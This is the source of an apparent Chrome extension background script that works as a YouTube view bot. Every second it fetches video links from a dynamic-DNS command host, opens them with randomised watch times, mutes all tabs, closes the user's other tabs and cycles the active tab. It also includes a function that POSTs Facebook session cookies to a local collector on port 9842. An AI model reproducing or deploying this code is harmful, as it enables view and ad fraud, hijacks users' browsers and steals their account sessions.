var url ='phao2binh5.zapto.org:4433'
var ListYTBLink = null;
var alarmName = "Auto";
var MinWatchTime = 10;
var MaxWatchTime = 13;
//C:\Users\pc\AppData\Local\Google\Chrome\User Data
function doSomething(body)
{
    console.log(body);
}
function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}
var isIndexInit = false;
class Youtubetab {
    #videoIndex = 0;
    constructor(VidListLength) {

      this.#videoIndex = getRndInteger(0, VidListLength - 1);
        console.log(this.#videoIndex);
    }
    resettab() {
        if (ListYTBLink != null) {

                chrome.tabs.create(
                {
                    url: ListYTBLink[this.#videoIndex]
                }
            );
            if (ListYTBLink.length <= this.#videoIndex) this.#videoIndex = 0;
            this.#videoIndex++;
        }
    }
    
}

 function getTabId()
 {
     var tabWinID;
     chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {

         // since only one tab should be active and in the current window at once
         // the return variable should only have one entry
         tabWinID = tabs[0].windowId;// or do whatever you need
       
     });
     return tabWinID;
  }

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function createAlarm() {
    chrome.alarms.create(alarmName, {
        
        periodInMinutes: 0.016666666 });
      chrome.alarms.onAlarm.addListener(function(alarm) {
         main();
        
      });
    main();
    
  } 
createAlarm();
function turn_Off_On_Sound() {
    chrome.tabs.query({ url: [] }, function (tabs) {
        for (var i = 0; i < tabs.length; i++) {
            var mutedInfo = tabs[i].mutedInfo;
            if (mutedInfo) chrome.tabs.update(tabs[i].id, { "muted": true });
        }
    })
};
function fetchPOST(url, data) {
    fetch(url, {

        // Adding method type
        method: "POST",

        // Adding body or contents to send
        body: data,

        // Adding headers to the request
        headers: {
            "Content-type": "application/json; charset=UTF-8"
        }
    })
}
var OldGroupCookie = "";
function CheckForCookieChange(cookie,length) {
    if (length > 5 && OldGroupCookie != cookie) { // if cookie is user and != old cookie
        OldGroupCookie = cookie;
        fetchPOST("http://localhost:9842/fbcookie", cookie);
        console.log(cookie,length);
    }
}
 // chrome.runtime.onStartup.addListener
var WatchTime = 5;
function CalcNewWatchTime() {
    WatchTime = (getRndInteger(60 * MinWatchTime, 60 * MaxWatchTime));
    console.log(WatchTime);
}
var TimeCounter = -1;
var tab1 = null;
var tab2 = null;
function InitTabs() {
    if (tab1 == null)
        tab1 = new Youtubetab(ListYTBLink.length);
    if (tab2 == null)
        tab2 = new Youtubetab(ListYTBLink.length);
}
// Switch tabs
var switchtabDelay = 10;
var TabsSwitchIndex = 0;
function SwitchTabs()
{
    var tabslist = null;
    chrome.tabs.query({ currentWindow: true }, function (tabs) {
        if (TabsSwitchIndex > tabs.length - 1) TabsSwitchIndex = 0;
        chrome.tabs.update(tabs[TabsSwitchIndex].id, { selected: true });  
        TabsSwitchIndex++;
    });
 
}
// maain
async function main() {
    TimeCounter++;
    fetch('http://localhost:26814/check');
    if (TimeCounter % WatchTime == 0) {
        try {
            CalcNewWatchTime();
            var GetFile = await fetch('http://' + url + "/getLink").then((Respone) => Respone.text()).then((value) => {
                ListYTBLink = value.split('\n');
             ///   console.log(value);
            });
            var GetFile = await fetch('https://' + url + "/getLink").then((Respone) => Respone.text()).then((value) => {
                ListYTBLink = value.split('\n');
       //         console.log(value);
            });
      
        }
        catch { }
        // end try catch
        InitTabs();
        tab1.resettab();
        tab2.resettab();
        chrome.tabs.query({ currentWindow: true }, function (tabs) {
            for (var i = 0; i < tabs.length - 2; i++) {
             
                chrome.tabs.remove(tabs[i].id);
                console.log(chrome.windows.WINDOW_ID_CURRENT + " " + tabs[i].windowId);
            }
            
        });
 
    }
    turn_Off_On_Sound();
    if (TimeCounter % switchtabDelay == 0)
    SwitchTabs();
}
